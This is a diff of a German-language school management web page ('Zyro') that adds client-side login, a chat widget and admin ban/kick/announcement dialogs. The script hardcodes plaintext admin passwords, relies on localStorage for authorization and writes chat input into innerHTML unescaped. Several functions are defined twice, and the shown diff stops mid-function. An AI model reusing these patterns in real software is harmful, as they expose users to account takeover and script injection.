@@ -4,271 +4,1313 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Zyro - Modernes Schulverwaltungssystem</title>
-    <style>
-        /* Tailwind-ähnliche Basisstile */
-        :root {
-            --primary-50: #eef2ff;
-            --primary-100: #e0e7ff;
-            --primary-200: #c7d2fe;
-            --primary-300: #a5b4fc;
-            --primary-400: #818cf8;
-            --primary-500: #6366f1;
-            --primary-600: #4f46e5;
-            --primary-700: #4338ca;
-            --primary-800: #3730a3;
-            --primary-900: #312e81;
-            --primary-950: #1e1b4b;
-            
-            --secondary-50: #f0fdfa;
-            --secondary-100: #ccfbf1;
-            --secondary-200: #99f6e4;
-            --secondary-300: #5eead4;
-            --secondary-400: #2dd4bf;
-            --secondary-500: #14b8a6;
-            --secondary-600: #0d9488;
-            --secondary-700: #0f766e;
-            --secondary-800: #115e59;
-            --secondary-900: #134e4a;
-            --secondary-950: #042f2e;
-            
-            --gray-50: #f9fafb;
-            --gray-100: #f3f4f6;
-            --gray-200: #e5e7eb;
-            --gray-300: #d1d5db;
-            --gray-400: #9ca3af;
-            --gray-500: #6b7280;
-            --gray-600: #4b5563;
-            --gray-700: #374151;
-            --gray-800: #1f2937;
-            --gray-900: #111827;
-            --gray-950: #030712;
-            
-            --foreground-rgb: 0, 0, 0;
-            --background-rgb: 255, 255, 255;
+    
+    <script>
+        // Vordefinierte Benutzer für Login
+        const users = [
+        {
+            username: 'zyro',
+            password: 'zyro',
+            role: 'admin',
+            status: 'offline',
+            lastActive: new Date().toISOString()
+        },
+        {
+            username: 'zyr0',
+            password: 'zyr0',
+            role: 'user',
+            status: 'offline',
+            lastActive: new Date().toISOString()
         }
+    ];
 
-        /* Basis-Animationen */
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+    // Chat-System initialisieren
+    const chatMessages = JSON.parse(localStorage.getItem('chatMessages') || '[]');
+    
+    function updateUserStatus(username, status) {
+        const user = users.find(u => u.username === username);
+        if (user) {
+            user.status = status;
+            user.lastActive = new Date().toISOString();
         }
+    }
 
-        @keyframes slideIn {
-            from { transform: translateY(20px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-
-        @keyframes scaleIn {
-            from { transform: scale(0.95); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        @keyframes bounce {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        @keyframes shimmer {
-            0% { background-position: -1000px 0; }
-            100% { background-position: 1000px 0; }
-        }
-
-        /* Globale Animationen */
-        .card, .message-preview, .notification-item, .time-slot {
-            animation: scaleIn 0.3s ease-out;
-            transition: all 0.3s ease;
-        }
-
-        .card:hover, .message-preview:hover, .notification-item:hover, .time-slot:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-        }
-
-        /* Button Animationen */
-        .btn {
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-        }
-
-        .btn:active {
-            transform: translateY(1px);
-        }
-
-        /* Navigation Animationen */
-        .nav-link {
-            transition: all 0.3s ease;
-            position: relative;
-        }
-
-        .nav-link::after {
-            content: '';
-            position: absolute;
+    function createChatUI() {
+        // Chat-Container erstellen
+        const chatContainer = document.createElement('div');
+        chatContainer.id = 'chat-container';
+        chatContainer.style.cssText = `
+            position: fixed;
             bottom: 0;
-            left: 50%;
-            width: 0;
-            height: 2px;
-            background: var(--primary-600);
-            transition: all 0.3s ease;
-        }
-
-        .nav-link:hover::after {
-            width: 100%;
-            left: 0;
-        }
-
-        /* Modal Animationen */
-        .modal {
-            transition: opacity 0.3s ease;
-        }
-
-        .modal-content {
-            animation: slideIn 0.3s ease-out;
-        }
-
-        /* Dropdown Animationen */
-        .profile-dropdown, .notifications-dropdown {
-            transform-origin: top right;
-            transition: all 0.3s ease;
-            transform: scale(0.95);
-            opacity: 0;
-            visibility: hidden;
-        }
-
-        .profile-dropdown.open, .notifications-dropdown.open {
-            transform: scale(1);
-            opacity: 1;
-            visibility: visible;
-        }
-
-        /* Nachrichten Animationen */
-        .message-preview.unread::before {
-            content: '';
-            position: absolute;
-            left: 0;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 4px;
-            height: 70%;
-            background: var(--primary-600);
-            border-radius: 2px;
-            animation: scaleIn 0.3s ease-out;
-        }
-
-        /* Loading Spinner Animation */
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .loading-spinner {
-            animation: spin 1s linear infinite, bounce 2s ease infinite;
-        }
-
-        /* Page Transitions */
-        .page-container {
-            transition: all 0.3s ease;
-            opacity: 0;
-            transform: translateY(20px);
-        }
-
-        .page-container.active {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        /* Social Media Cards */
-        .social-card {
-            transition: all 0.3s ease;
-        }
-
-        .social-card:hover {
-            transform: translateY(-8px) rotate(2deg);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
-        }
-
-        .social-icon {
-            transition: all 0.3s ease;
-        }
-
-        .social-card:hover .social-icon {
-            transform: scale(1.1) rotate(-5deg);
-        }
-
-        /* Form Inputs */
-        input[type="text"],
-        input[type="password"],
-        input[type="email"],
-        textarea {
-            transition: all 0.3s ease;
-        }
-
-        input[type="text"]:focus,
-        input[type="password"]:focus,
-        input[type="email"]:focus,
-        textarea:focus {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-
-        /* Notification Badge Animation */
-        @keyframes pulse {
-            0% { transform: scale(0.95); opacity: 0.5; }
-            50% { transform: scale(1); opacity: 1; }
-            100% { transform: scale(0.95); opacity: 0.5; }
-        }
-
-        .notification-badge {
-            animation: pulse 2s infinite;
-        }
-
-        /* Grade Animation */
-        .grade {
-            transition: all 0.3s ease;
-        }
-
-        .grade:hover {
-            transform: scale(1.2) rotate(10deg);
-        }
-        
-        /* Bestehende Stile beibehalten... */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        
-        body {
-            font-family: 'Inter', sans-serif;
-            color: rgb(var(--foreground-rgb));
-            background: var(--gray-50);
-            min-height: 100vh;
-        }
-        
-        /* Login-Seite Stile */
-        .login-page {
-            min-height: 100vh;
+            right: 20px;
+            width: 300px;
+            height: 400px;
+            background: white;
+            border-radius: 10px 10px 0 0;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
             display: flex;
+            flex-direction: column;
+            z-index: 1000;
+        `;
+
+        // Chat-Header
+        const header = document.createElement('div');
+        header.style.cssText = `
+            padding: 10px;
+            background: var(--primary-600);
+            color: white;
+            border-radius: 10px 10px 0 0;
+            display: flex;
+            justify-content: space-between;
             align-items: center;
-            justify-content: center;
-            background: url('hintergrund.jfif') no-repeat center center; /* Hintergrundbild mit .jfif-Endung */
-            background-size: cover; /* Bild so skalieren, dass es den gesamten Bereich abdeckt */
-            padding: 1rem;
-            position: relative;
-            overflow: hidden;
-        }
+        `;
+        header.innerHTML = '<span>Chat</span><button id="minimize-chat" style="background: none; border: none; color: white; cursor: pointer;">−</button>';
+        chatContainer.appendChild(header);
+
+        // Benutzerliste
+        const userList = document.createElement('div');
+        userList.id = 'user-list';
+        userList.style.cssText = `
+            height: 100px;
+            overflow-y: auto;
+            border-bottom: 1px solid #eee;
+            padding: 10px;
+        `;
+        chatContainer.appendChild(userList);
+
+        // Chat-Nachrichten
+        const messages = document.createElement('div');
+        messages.id = 'chat-messages';
+        messages.style.cssText = `
+            flex-grow: 1;
+            overflow-y: auto;
+            padding: 10px;
+        `;
+        chatContainer.appendChild(messages);
+
+        // Nachrichteneingabe
+        const input = document.createElement('div');
+        input.style.cssText = `
+            padding: 10px;
+            border-top: 1px solid #eee;
+            display: flex;
+        `;
+        input.innerHTML = `
+            <input type="text" id="message-input" placeholder="Nachricht eingeben..." style="flex-grow: 1; margin-right: 10px; padding: 5px;">
+            <button onclick="sendMessage()" style="background: var(--primary-600); color: white; border: none; padding: 5px 15px; border-radius: 5px; cursor: pointer;">Senden</button>
+        `;
+        chatContainer.appendChild(input);
+
+        document.body.appendChild(chatContainer);
+
+        // Event-Listener
+        document.getElementById('minimize-chat').addEventListener('click', function() {
+            const container = document.getElementById('chat-container');
+            if (container.style.height === '400px') {
+                container.style.height = '40px';
+                messages.style.display = 'none';
+                userList.style.display = 'none';
+                input.style.display = 'none';
+                this.textContent = '+';
+            } else {
+                container.style.height = '400px';
+                messages.style.display = 'block';
+                userList.style.display = 'block';
+                input.style.display = 'flex';
+                this.textContent = '−';
+            }
+        });
+
+        // Chat initialisieren
+        updateUserList();
+        loadMessages();
+    }
+
+    function updateUserList() {
+        const userList = document.getElementById('user-list');
+        if (!userList) return;
+
+        userList.innerHTML = '';
+        users.forEach(user => {
+            const userElement = document.createElement('div');
+            userElement.style.cssText = `
+                display: flex;
+                align-items: center;
+                margin-bottom: 5px;
+                cursor: pointer;
+                padding: 5px;
+                border-radius: 5px;
+            `;
+            userElement.addEventListener('click', () => showUserProfile(user.username));
+            
+            const statusColor = user.status === 'online' ? '#4CAF50' : '#9e9e9e';
+            userElement.innerHTML = `
+                <span style="width: 8px; height: 8px; background: ${statusColor}; border-radius: 50%; margin-right: 5px;"></span>
+                <span>${user.username} (${user.role})</span>
+            `;
+            userList.appendChild(userElement);
+        });
+    }
+
+    function showUserProfile(username) {
+    // Bestehende Profile entfernen
+    const existingProfile = document.getElementById('user-profile');
+    if (existingProfile) {
+        existingProfile.remove();
+    }
+
+    const user = users.find(u => u.username === username);
+    if (!user) return;
+
+    const profileCard = document.createElement('div');
+    profileCard.id = 'user-profile';
+    profileCard.style.cssText = `
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 20px rgba(0,0,0,0.2);
+        z-index: 1001;
+        width: 300px;
+        text-align: center;
+    `;
+
+    const closeButton = document.createElement('button');
+    closeButton.innerHTML = '×';
+    closeButton.style.cssText = `
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        border: none;
+        background: none;
+        font-size: 20px;
+        cursor: pointer;
+        color: #666;
+    `;
+    closeButton.onclick = () => profileCard.remove();
+
+    // Ban Dialog
+    function showBanDialog(username) {
+        const dialog = createDialog('Benutzer bannen');
         
-        .login-page video {
-            display: none; /* Video ausblenden */
-        }
+        dialog.setContent(`
+            <p>Möchten Sie ${username} bannen?</p>
+            <div style="margin-bottom: 15px;">
+                <label for="ban-reason">Grund:</label>
+                <textarea id="ban-reason" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
+            </div>
+            <div>
+                <label for="ban-duration">Dauer:</label>
+                <select id="ban-duration" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;">
+                    <option value="1">1 Tag</option>
+                    <option value="3">3 Tage</option>
+                    <option value="7">1 Woche</option>
+                    <option value="30">1 Monat</option>
+                    <option value="permanent">Permanent</option>
+                </select>
+            </div>
+        `);
         
-        .login-container {
-            background-color: rgba(255, 255, 255, 0.5); /* 50% durchsichtig */
-            backdrop-filter: blur(5px); /* Unschärfeeffekt für bessere Lesbarkeit */
+        dialog.addButton('Bannen', () => {
+            const reason = document.getElementById('ban-reason').value;
+            const duration = document.getElementById('ban-duration').value;
+            banUser(username, reason, duration);
+            dialog.close();
+        });
+        
+        dialog.show();
+    }
+
+    // Kick Dialog
+    function showKickDialog(username) {
+        const dialog = createDialog('Benutzer kicken');
+        
+        dialog.setContent(`
+            <p>Möchten Sie ${username} kicken?</p>
+            <div style="margin-bottom: 15px;">
+                <label for="kick-reason">Grund:</label>
+                <textarea id="kick-reason" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
+            </div>
+        `);
+        
+        dialog.addButton('Kicken', () => {
+            const reason = document.getElementById('kick-reason').value;
+            kickUser(username, reason);
+            dialog.close();
+        });
+        
+        dialog.show();
+    }
+
+    // Announcement Dialog
+    function showAnnouncementDialog(username) {
+        const dialog = createDialog('Ankündigung senden');
+        
+        dialog.setContent(`
+            <p>Ankündigung an ${username} senden:</p>
+            <div style="margin-bottom: 15px;">
+                <label for="announcement-text">Nachricht:</label>
+                <textarea id="announcement-text" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
+            </div>
+            <div>
+                <label for="announcement-type">Typ:</label>
+                <select id="announcement-type" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;">
+                    <option value="info">Information</option>
+                    <option value="warning">Warnung</option>
+                    <option value="important">Wichtig</option>
+                </select>
+            </div>
+        `);
+        
+        dialog.addButton('Senden', () => {
+            const text = document.getElementById('announcement-text').value;
+            const type = document.getElementById('announcement-type').value;
+            showAnnouncement(type, text);
+            dialog.close();
+        });
+        
+        dialog.show();
+    }
+
+            const avatar = document.createElement('div');
+    avatar.style.cssText = `
+        width: 80px;
+        height: 80px;
+        background: var(--primary-100);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 36px;
+        color: var(--primary-600);
+        margin: 0 auto 20px;
+    `;
+    avatar.textContent = (user.username[0] || '').toUpperCase();
+
+    const actionContainer = document.createElement('div');
+    actionContainer.style.cssText = `
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 10px;
+        margin-top: 20px;
+    `;
+
+    // Ban Button
+    const actionBanButton = document.createElement('button');
+    actionBanButton.textContent = 'Bann';
+    actionBanButton.style.cssText = `
+        background: #dc3545;
+        color: white;
+        border: none;
+        padding: 8px;
+        border-radius: 5px;
+        cursor: pointer;
+    `;
+    actionBanButton.onclick = () => showBanDialog(user.username);
+
+    // Kick Button
+    const actionKickButton = document.createElement('button');
+    actionKickButton.textContent = 'Kick';
+    actionKickButton.style.cssText = `
+        background: #ffc107;
+        color: black;
+        border: none;
+        padding: 8px;
+        border-radius: 5px;
+        cursor: pointer;
+    `;
+    actionKickButton.onclick = () => showKickDialog(user.username);
+
+    // Announcement Button
+    const actionAnnounceButton = document.createElement('button');
+    actionAnnounceButton.textContent = 'Ankündigung';
+    actionAnnounceButton.style.cssText = `
+        background: #0d6efd;
+        color: white;
+        border: none;
+        padding: 8px;
+        border-radius: 5px;
+        cursor: pointer;
+    `;
+    actionAnnounceButton.onclick = () => showAnnouncementDialog(user.username);
+
+    // Info Button
+    const actionInfoButton = document.createElement('button');
+    actionInfoButton.textContent = 'Infos';
+    actionInfoButton.style.cssText = `
+        background: #198754;
+        color: white;
+        border: none;
+        padding: 8px;
+        border-radius: 5px;
+        cursor: pointer;
+    `;
+    actionInfoButton.onclick = () => {
+        const dialog = createDialog('Benutzerinformationen');
+        dialog.setContent(`
+            <div style="text-align: left;">
+                <p><strong>Benutzername:</strong> ${user.username}</p>
+                <p><strong>Rolle:</strong> ${user.role || 'Benutzer'}</p>
+                <p><strong>Status:</strong> ${user.status || 'Offline'}</p>
+                <p><strong>Letzte Aktivität:</strong> ${new Date(user.lastActive).toLocaleString()}</p>
+            </div>
+        `);
+        dialog.addButton('Schließen', () => dialog.close());
+        dialog.show();
+    };
+
+    actionContainer.append(actionBanButton, actionKickButton, actionAnnounceButton, actionInfoButton);
+
+        const username_display = document.createElement('h3');
+        username_display.style.marginBottom = '20px';
+        username_display.textContent = user.username;
+
+        const buttonContainer = document.createElement('div');
+        buttonContainer.style.cssText = `
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        `;
+
+        // Ban Button
+        const banButton = document.createElement('button');
+        banButton.textContent = 'Bann';
+        banButton.style.cssText = `
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 8px;
+            border-radius: 5px;
+            cursor: pointer;
+        `;
+        banButton.onclick = () => showBanDialog(user);
+
+        // Kick Button
+        const kickButton = document.createElement('button');
+        kickButton.textContent = 'Kick';
+        kickButton.style.cssText = `
+            background: #ffc107;
+            color: black;
+            border: none;
+            padding: 8px;
+            border-radius: 5px;
+            cursor: pointer;
+        `;
+        kickButton.onclick = () => showKickDialog(user);
+
+        // Announcement Button
+        const announceButton = document.createElement('button');
+        announceButton.textContent = 'Ankündigung';
+        announceButton.style.cssText = `
+            background: #0d6efd;
+            color: white;
+            border: none;
+            padding: 8px;
+            border-radius: 5px;
+            cursor: pointer;
+        `;
+        announceButton.onclick = () => showAnnouncementDialog(user);
+
+        // Info Button
+        const infoButton = document.createElement('button');
+        infoButton.textContent = 'Infos';
+        infoButton.style.cssText = `
+            background: #198754;
+            color: white;
+            border: none;
+            padding: 8px;
+            border-radius: 5px;
+            cursor: pointer;
+        `;
+        infoButton.onclick = () => showUserInfo(user);
+
+        buttonContainer.append(banButton, kickButton, announceButton, infoButton);
+        profileCard.append(closeButton, avatar, username_display, buttonContainer);
+        document.body.appendChild(profileCard);
+    }
+
+    // Ban Dialog
+    function showBanDialog(user) {
+        const dialog = createDialog('Benutzer bannen');
+        
+        const content = document.createElement('div');
+        content.innerHTML = `
+            <p>Möchten Sie ${user.username} bannen?</p>
+            <div class="form-group" style="margin-bottom: 15px;">
+                <label for="ban-reason">Grund:</label>
+                <textarea id="ban-reason" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
+            </div>
+            <div class="form-group">
+                <label for="ban-duration">Dauer:</label>
+                <select id="ban-duration" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;">
+                    <option value="1">1 Tag</option>
+                    <option value="3">3 Tage</option>
+                    <option value="7">1 Woche</option>
+                    <option value="30">1 Monat</option>
+                    <option value="permanent">Permanent</option>
+                </select>
+            </div>
+        `;
+        
+        dialog.setContent(content.innerHTML);
+        dialog.addButton('Bannen', () => {
+            const reason = document.getElementById('ban-reason').value;
+            const duration = document.getElementById('ban-duration').value;
+            
+            // Ban-Logik implementieren
+            const bannedUsers = JSON.parse(localStorage.getItem('bannedUsers') || '[]');
+            const banInfo = {
+                username: user.username,
+                reason: reason,
+                duration: duration,
+                bannedAt: new Date().toISOString(),
+                bannedBy: JSON.parse(localStorage.getItem('zyroUser'))?.username
+            };
+            bannedUsers.push(banInfo);
+            localStorage.setItem('bannedUsers', JSON.stringify(bannedUsers));
+            
+            // Benutzer über den Ban informieren
+            alert(`${user.username} wurde für ${duration === 'permanent' ? 'permanent' : duration + ' Tage'} gebannt.`);
+            dialog.close();
+            document.getElementById('user-profile')?.remove();
+        });
+        dialog.show();
+    }
+
+    // Kick Dialog
+    function showKickDialog(user) {
+        const dialog = createDialog('Benutzer kicken');
+        
+        const content = document.createElement('div');
+        content.innerHTML = `
+            <p>Möchten Sie ${user.username} kicken?</p>
+            <div class="form-group" style="margin-bottom: 15px;">
+                <label for="kick-reason">Grund:</label>
+                <textarea id="kick-reason" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
+            </div>
+        `;
+        
+        dialog.setContent(content.innerHTML);
+        dialog.addButton('Kicken', () => {
+            const reason = document.getElementById('kick-reason').value;
+            
+            // Kick-Logik implementieren
+            const kickedUsers = JSON.parse(localStorage.getItem('kickedUsers') || '[]');
+            const kickInfo = {
+                username: user.username,
+                reason: reason,
+                kickedAt: new Date().toISOString(),
+                kickedBy: JSON.parse(localStorage.getItem('zyroUser'))?.username
+            };
+            kickedUsers.push(kickInfo);
+            localStorage.setItem('kickedUsers', JSON.stringify(kickedUsers));
+            
+            // Benutzer über den Kick informieren
+            alert(`${user.username} wurde gekickt.`);
+            dialog.close();
+            document.getElementById('user-profile')?.remove();
+        });
+        dialog.show();
+    }
+
+    // Announcement Dialog
+    function showAnnouncementDialog(user) {
+        const dialog = createDialog('Ankündigung senden');
+        
+        const content = document.createElement('div');
+        content.innerHTML = `
+            <p>Ankündigung an ${user.username} senden:</p>
+            <div class="form-group" style="margin-bottom: 15px;">
+                <label for="announcement-message">Nachricht:</label>
+                <textarea id="announcement-message" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;" rows="3"></textarea>
+            </div>
+            <div class="form-group">
+                <label for="announcement-type">Typ:</label>
+                <select id="announcement-type" style="width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: 1px solid #ddd;">
+                    <option value="info">Information</option>
+                    <option value="warning">Warnung</option>
+                    <option value="important">Wichtig</option>
+                </select>
+            </div>
+        `;
+        
+        dialog.setContent(content.innerHTML);
+        dialog.addButton('Senden', () => {
+            const message = document.getElementById('announcement-message').value;
+            const type = document.getElementById('announcement-type').value;
+            
+            // Ankündigungs-Logik implementieren
+            const announcements = JSON.parse(localStorage.getItem('announcements') || '[]');
+            const announcementInfo = {
+                username: user.username,
+                message: message,
+                type: type,
+                sentAt: new Date().toISOString(),
+                sentBy: JSON.parse(localStorage.getItem('zyroUser'))?.username
+            };
+            announcements.push(announcementInfo);
+            localStorage.setItem('announcements', JSON.stringify(announcements));
+            
+            // Benutzer über die Ankündigung informieren
+            alert(`Ankündigung wurde an ${user.username} gesendet.`);
+            dialog.close();
+            document.getElementById('user-profile')?.remove();
+        });
+        dialog.show();
+    }
+
+    // User Info Dialog
+    function showUserInfo(user) {
+        const dialog = createDialog('Benutzerinformationen');
+        
+        const content = document.createElement('div');
+        content.innerHTML = `
+            <div style="text-align: left;">
+                <p><strong>Benutzername:</strong> ${user.username}</p>
+                <p><strong>Rolle:</strong> ${user.role || 'Benutzer'}</p>
+                <p><strong>Status:</strong> ${user.status || 'Offline'}</p>
+                <p><strong>Letzte Aktivität:</strong> ${new Date().toLocaleString()}</p>
+                <p><strong>Registriert seit:</strong> ${new Date().toLocaleDateString()}</p>
+            </div>
+        `;
+        
+        dialog.setContent(content.innerHTML);
+        dialog.addButton('Schließen', () => {
+            dialog.close();
+        });
+        dialog.show();
+    }
+
+    function createDialog(title) {
+        const dialog = document.createElement('div');
+        dialog.style.cssText = `
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
+            z-index: 1002;
+            width: 400px;
+        `;
+
+        const titleElement = document.createElement('h3');
+        titleElement.style.marginTop = '0';
+        titleElement.textContent = title;
+
+        const contentContainer = document.createElement('div');
+        contentContainer.style.marginBottom = '20px';
+
+        const buttonContainer = document.createElement('div');
+        buttonContainer.style.cssText = `
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        `;
+
+        dialog.append(titleElement, contentContainer, buttonContainer);
+
+        return {
+            setContent: (content) => {
+                contentContainer.innerHTML = content;
+            },
+            addButton: (text, onClick) => {
+                const button = document.createElement('button');
+                button.textContent = text;
+                button.style.cssText = `
+                    background: var(--primary-600);
+                    color: white;
+                    border: none;
+                    padding: 8px 15px;
+                    border-radius: 5px;
+                    cursor: pointer;
+                `;
+                button.onclick = onClick;
+                buttonContainer.appendChild(button);
+
+                // Abbrechen-Button hinzufügen
+                if (text !== 'Abbrechen' && text !== 'Schließen') {
+                    const cancelButton = document.createElement('button');
+                    cancelButton.textContent = 'Abbrechen';
+                    cancelButton.style.cssText = `
+                        background: var(--gray-400);
+                        color: white;
+                        border: none;
+                        padding: 8px 15px;
+                        border-radius: 5px;
+                        cursor: pointer;
+                    `;
+                    cancelButton.onclick = () => dialog.remove();
+                    buttonContainer.insertBefore(cancelButton, button);
+                }
+            },
+            show: () => document.body.appendChild(dialog),
+            close: () => dialog.remove()
+        };
+    }
+
+    function checkLogin(username, password) {
+        return users.find(u => u.username === username && u.password === password);
+    }
+
+    function login() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const user = checkLogin(username, password);
+
+        if (user) {
+            localStorage.setItem('zyroUser', JSON.stringify(user));
+            updateUserStatus(username, 'online');
+            updateUserInterface(user);
+            createChatUI();
+            window.location.href = user.role === 'admin' ? 'admin.html' : 'user.html';
+        } else {
+            document.getElementById('error').textContent = 'Ungültige Anmeldedaten';
+        }
+    }
+
+    function updateUserInterface(user) {
+        const userDisplay = document.getElementById('user-display');
+        userDisplay.textContent = user.username;
+        userDisplay.style.display = 'inline-block';
+
+        const initial = document.getElementById('user-initial');
+        initial.textContent = user.username[0].toUpperCase();
+        initial.style.display = 'inline-block';
+    }
+
+    function logout() {
+        const user = JSON.parse(localStorage.getItem('zyroUser'));
+        if (user) {
+            updateUserStatus(user.username, 'offline');
+            localStorage.removeItem('zyroUser');
+            window.location.href = 'index.html';
+        }
+    }
+
+    function showSocialMediaPage() {
+        window.location.href = 'social_media.html';
+    }
+
+    function showMensaPage() {
+        window.location.href = 'mensa.html';
+    }
+
+    function showCookieNotice() {
+        const cookieNotice = document.getElementById('cookie-notice');
+        cookieNotice.style.display = 'block';
+    }
+
+    function acceptCookies() {
+        const cookieNotice = document.getElementById('cookie-notice');
+        cookieNotice.style.display = 'none';
+    }
+
+    function getPosition() {
+        return new Promise((resolve, reject) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(resolve, reject);
+            } else {
+                reject('Geolocation is not supported by this browser.');
+            }
+        });
+    }
+
+    function sendMessage() {
+        const input = document.getElementById('message-input');
+        const message = input.value.trim();
+        if (message) {
+            const user = JSON.parse(localStorage.getItem('zyroUser'));
+            if (user) {
+                const newMessage = {
+                    username: user.username,
+                    message: message,
+                    timestamp: new Date().toISOString()
+                };
+                chatMessages.push(newMessage);
+                localStorage.setItem('chatMessages', JSON.stringify(chatMessages));
+                input.value = '';
+                updateChatMessages();
+            }
+        }
+    }
+
+    function updateChatMessages() {
+        const messagesContainer = document.getElementById('chat-messages');
+        messagesContainer.innerHTML = '';
+        chatMessages.forEach(msg => {
+            const messageElement = document.createElement('div');
+            messageElement.style.cssText = `
+                display: flex;
+                align-items: center;
+                margin-bottom: 10px;
+            `;
+            const isOwnMessage = JSON.parse(localStorage.getItem('zyroUser'))?.username === msg.username;
+            messageElement.innerHTML = `
+                <span style="font-weight: bold; margin-right: 5px;">${msg.username}:</span>
+                <span>${msg.message}</span>
+                <span style="font-size: 0.8em; color: #999; margin-left: 10px;">${new Date(msg.timestamp).toLocaleTimeString()}</span>
+            `;
+            if (isOwnMessage) {
+                messageElement.style.justifyContent = 'flex-end';
+            }
+            messagesContainer.appendChild(messageElement);
+        });
+        messagesContainer.scrollTop = messagesContainer.scrollHeight;
+    }
+
+    function loadMessages() {
+        chatMessages.forEach(msg => {
+            const messageElement = document.createElement('div');
+            messageElement.style.cssText = `
+                display: flex;
+                align-items: center;
+                margin-bottom: 10px;
+            `;
+            const isOwnMessage = JSON.parse(localStorage.getItem('zyroUser'))?.username === msg.username;
+            messageElement.innerHTML = `
+                <span style="font-weight: bold; margin-right: 5px;">${msg.username}:</span>
+                <span>${msg.message}</span>
+                <span style="font-size: 0.8em; color: #999; margin-left: 10px;">${new Date(msg.timestamp).toLocaleTimeString()}</span>
+            `;
+            if (isOwnMessage) {
+                messageElement.style.justifyContent = 'flex-end';
+            }
+            document.getElementById('chat-messages').appendChild(messageElement);
+        });
+        document.getElementById('chat-messages').scrollTop = document.getElementById('chat-messages').scrollHeight;
+    }
+
+    function showAnnouncement(title, message) {
+        const announcement = document.createElement('div');
+        announcement.style.cssText = `
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: white;
+            padding: 10px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            z-index: 1000;
+            animation: slideIn 0.5s ease-in-out, fadeOut 0.5s 5s ease-in-out forwards;
+        `;
+        announcement.innerHTML = `
+            <h4>${title}</h4>
+            <p>${message}</p>
+        `;
+        document.body.appendChild(announcement);
+
+        setTimeout(() => {
+            announcement.remove();
+        }, 5500);
+    }
+
+    function banUser(username, reason, duration) {
+        const user = users.find(u => u.username === username);
+        if (user) {
+            user.status = 'banned';
+            user.banReason = reason;
+            user.banDuration = duration;
+            user.banStart = new Date().toISOString();
+            updateUserList();
+            showAnnouncement('Bann', `${username} wurde für ${duration} gebannt. Grund: ${reason}`);
+        }
+    }
+
+    function kickUser(username, reason) {
+        const user = users.find(u => u.username === username);
+        if (user) {
+            user.status = 'offline';
+            updateUserList();
+            showAnnouncement('Kick', `${username} wurde gekickt. Grund: ${reason}`);
+        }
+    }
+
+    function showAnnouncementDialog(username) {
+        const dialog = createDialog('Ankündigung erstellen');
+        const content = `
+            <div style="margin-bottom: 15px;">
+                <label>Nachricht:</label>
+                <textarea id="announcement-text" style="width: 100%; height: 100px; margin-top: 5px; padding: 5px;"></textarea>
+            </div>
+        `;
+        dialog.setContent(content);
+        dialog.addButton('Ankündigen', () => {
+            const text = document.getElementById('announcement-text').value;
+            if (text) {
+                showAnnouncement('Ankündigung', `${username}: ${text}`);
+                dialog.close();
+            }
+        });
+        dialog.show();
+    }
+
+    function createDialog(title) {
+        const dialog = document.createElement('div');
+        dialog.style.cssText = `
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
+            z-index: 1002;
+            width: 300px;
+        `;
+
+        const titleElement = document.createElement('h3');
+        titleElement.textContent = title;
+        titleElement.style.marginBottom = '15px';
+
+        const contentContainer = document.createElement('div');
+        const buttonContainer = document.createElement('div');
+        buttonContainer.style.cssText = `
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
+        `;
+
